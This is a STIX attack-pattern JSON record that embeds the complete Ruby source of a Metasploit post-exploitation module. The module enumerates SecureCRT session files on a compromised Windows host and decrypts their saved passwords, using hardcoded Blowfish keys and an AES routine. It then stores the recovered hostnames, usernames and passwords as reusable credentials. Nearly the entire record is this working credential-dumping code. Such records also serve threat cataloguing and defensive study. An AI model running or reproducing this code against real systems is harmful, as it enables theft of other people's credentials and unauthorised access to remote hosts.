{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bedb6878-d416-4afe-b7d2-2567c6bdb288",
    "created": "2024-08-14T16:33:08.249865Z",
    "modified": "2024-08-14T16:33:08.249868Z",
    "name": "Windows SecureCRT Session Information Enumeration",
    "description": " This module will determine if SecureCRT is installed on the target system and, if it is, it will try to dump all saved session information from the target. The passwords for these saved sessions will then be decrypted where possible, using the decryption information that HyperSine reverse engineered.  Note that whilst SecureCRT has installers for Linux, Mac and Windows, this module presently only works on Windows.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/securecrt.rb",
            "external_id": "securecrt.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows SecureCRT Session Information Enumeration',\n        'Description' => %q{\n          This module will determine if SecureCRT is installed on the target system and, if it is, it will try to\n          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted\n          where possible, using the decryption information that HyperSine reverse engineered.\n\n          Note that whilst SecureCRT has installers for Linux, Mac and Windows, this module presently only works on Windows.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md']\n        ],\n        'Author' => [\n          'HyperSine', # Original author of the SecureCRT session decryption script and one who found the encryption keys.\n          'Kali-Team <kali-team[at]qq.com>' # Metasploit module\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'Reliability' => [],\n          'Stability' => [],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_search\n              stdapi_fs_separator\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('PASSPHRASE', [ false, 'The configuration password that was set when SecureCRT was installed, if one was supplied']),\n        OptString.new('SESSION_PATH', [ false, 'Specifies the session directory path for SecureCRT']),\n      ]\n    )\n  end\n\n  def blowfish_decrypt(secret_key, text)\n    cipher = OpenSSL::Cipher.new('bf-cbc').decrypt\n    cipher.padding = 0\n    cipher.key_len = secret_key.length\n    cipher.key = secret_key\n    cipher.iv = \"\\x00\" * 8\n    cipher.update(text) + cipher.final\n  end\n\n  def try_encode_file(data)\n    if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]\n      data[2..].force_encoding('UTF-16LE').encode('UTF-8')\n    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]\n      data\n    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]\n      data[2..].force_encoding('UTF-16BE').encode('UTF-8')\n    else\n      data\n    end\n  end\n\n  def enum_session_file(path)\n    config_ini = []\n    tbl = []\n    begin\n      print_status(\"Searching for session files in #{path}\")\n      config_ini += session.fs.file.search(path, '*.ini')\n      fail_with(Failure::BadConfig, \"Couldn't find any session files at #{path}\") if config_ini.empty?\n    rescue Rex::Post::Meterpreter::RequestError\n      fail_with(Failure::BadConfig, \"The SecureCRT registry key on the target is likely misconfigured. The directory at #{path} is inaccessable or doesn't exist\")\n    end\n\n    # enum session file\n    config_ini.each do |item|\n      file_name = item['path'] + session.fs.file.separator + item['name']\n      file_contents = read_file(file_name) if !['__FolderData__.ini', 'Default.ini'].include?(item['name'])\n      if file_contents.nil? || file_contents.empty?\n        next\n      end\n\n      file = try_encode_file(file_contents).force_encoding(Encoding::UTF_8)\n      protocol = file[/\"Protocol Name\"=(?<protocol>[^\\s]+)/u, 'protocol']\n      hostname = file[/\"Hostname\"=(?<hostname>[^\\s]+)/u, 'hostname']\n      decrypted_script = securecrt_crypto_v2(file[/\"Login Script V3\"=02:(?<script>[0-9a-f]+)/u, 'script'])\n      if !decrypted_script.nil?\n        username = decrypted_script[/l*ogin(?: name)?:\\x1F(?<login>\\S+)\\x1F(?:\\d)\\x1Fp*ass/u, 'login']\n        password = decrypted_script[/p*assword:\\x1F(?<password>\\S+)\\x1F/u, 'password']\n        domain = decrypted_script[/[Ww]*indows [Dd]*omain:\\x1F(?<domain>\\S+)\\x1F/u, 'domain']\n        if !domain.nil? && !username.nil?\n          username = \"#{domain}\\\\#{username}\"\n        end\n      else\n        password = securecrt_crypto(file[/\"Password\"=u(?<password>[0-9a-f]+)/u, 'password'])\n        passwordv2 = securecrt_crypto_v2(file[/\"Password V2\"=02:(?<passwordv2>[0-9a-f]+)/, 'passwordv2'])\n        username = file[/\"Username\"=(?<username>[^\\s]+)/, 'username']\n      end\n\n      port = file[/#{protocol}\\r\\n\\w:\"Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s\n      port = file[/\\[#{protocol}\\] Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s if port.nil?\n\n      tbl << {\n        file_name: item['name'],\n        protocol: protocol.nil? ? protocol : protocol.downcase,\n        hostname: hostname,\n        port: port,\n        username: username,\n        password: password || passwordv2\n      }\n    end\n    return tbl\n  end\n\n  def securecrt_crypto(ciphertext)\n    return nil if ciphertext.nil? || ciphertext.empty?\n\n    key1 = \"\\x24\\xA6\\x3D\\xDE\\x5B\\xD3\\xB3\\x82\\x9C\\x7E\\x06\\xF4\\x08\\x16\\xAA\\x07\"\n    key2 = \"\\x5F\\xB0\\x45\\xA2\\x94\\x17\\xD9\\x16\\xC6\\xC6\\xA2\\xFF\\x06\\x41\\x82\\xB7\"\n    ciphered_bytes = [ciphertext].pack('H*')\n    cipher_tmp = blowfish_decrypt(key1, ciphered_bytes)[4..-5]\n    padded_plain_bytes = blowfish_decrypt(key2, cipher_tmp)\n    (0..padded_plain_bytes.length).step(2) do |i|\n      if (padded_plain_bytes[i] == \"\\x00\" && padded_plain_bytes[i + 1] == \"\\x00\")\n        return padded_plain_bytes[0..i - 1].force_encoding('UTF-16LE').encode('UTF-8')\n      end\n    end\n    print_warning('It was not possible to decode one of the v1 passwords successfully, please double check the results!')\n    return nil # We didn't decode the password successfully, so just return nil.\n  end\n\n  def securecrt_crypto_v2(ciphertext)\n    return nil if ciphertext.nil? || ciphertext.empty?\n\n    iv = (\"\\x00\" * 16)\n    config_passphrase = datastore['PASSPHRASE'] || nil\n    key = OpenSSL::Digest::SHA256.new(config_passphrase).digest\n    aes = OpenSSL::Cipher.new('AES-256-CBC')\n    aes.decrypt\n    aes.key = key\n    aes.padding = 0\n    aes.iv = iv\n    padded_plain_bytes = aes.update([ciphertext].pack('H*'))\n    plain_bytes_length = padded_plain_bytes[0, 4].unpack1('l') # bytes to int little-endian format.\n    plain_bytes = padded_plain_bytes[4, plain_bytes_length]\n    plain_bytes_digest = padded_plain_bytes[4 + plain_bytes_length, 32]\n    if (OpenSSL::Digest::SHA256.new(plain_bytes).digest == plain_bytes_digest) # verify\n      return plain_bytes.force_encoding('UTF-8')\n    end\n\n    print_warning('It seems the user set a configuration password when installing SecureCRT!')\n    print_warning('If you know the configuration password, please provide it via the PASSPHRASE option and then run the module again.')\n    return nil\n  end\n\n  def securecrt_store_config(config)\n    if config[:hostname].to_s.empty? || config[:service_name].to_s.empty? || config[:port].to_s.empty? || config[:username].to_s.empty? || config[:password].nil?\n      return # If any of these fields are nil or are empty (with the exception of the password field which can be empty),\n      # then we shouldn't proceed, as we don't have enough info to store a credential which someone could actually\n      # use against a target.\n    end\n\n    service_data = {\n      address: config[:hostname],\n      port: config[:port],\n      service_name: config[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :password,\n      private_data: config[:password],\n      username: config[:username],\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n    create_credential_and_login(credential_data)\n  end\n\n  def run\n    print_status(\"Gathering SecureCRT session information from #{sysinfo['Computer']}\")\n    securecrt_path = ''\n    if datastore['SESSION_PATH'].to_s.empty?\n      parent_key = 'HKEY_CURRENT_USER\\\\Software\\\\VanDyke\\\\SecureCRT'\n      # get session file path\n      root_path = registry_getvaldata(parent_key, 'Config Path')\n      securecrt_path = expand_path(\"#{root_path}#{session.fs.file.separator}Sessions\") if !root_path.to_s.empty?\n    else\n      securecrt_path = expand_path(datastore['SESSION_PATH'])\n    end\n\n    if securecrt_path.to_s.empty?\n      fail_with(Failure::NotFound, 'Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')\n    else\n      result = enum_session_file(securecrt_path)\n      columns = [\n        'Filename',\n        'Protocol',\n        'Hostname',\n        'Port',\n        'Username',\n        'Password',\n      ]\n      tbl = Rex::Text::Table.new(\n        'Header' => 'SecureCRT Sessions',\n        'Columns' => columns\n      )\n      result.each do |item|\n        tbl << item.values\n        config = {\n          file_name: item[:file_name],\n          hostname: item[:hostname],\n          service_name: item[:protocol],\n          port: item[:port].nil? ? '' : item[:port].to_i,\n          username: item[:username],\n          password: item[:password]\n        }\n        securecrt_store_config(config)\n      end\n      print_line(tbl.to_s)\n      if tbl.rows.count\n        path = store_loot('host.securecrt_sessions', 'text/plain', session, tbl, 'securecrt_sessions.txt', 'SecureCRT Sessions')\n        print_good(\"Session info stored in: #{path}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}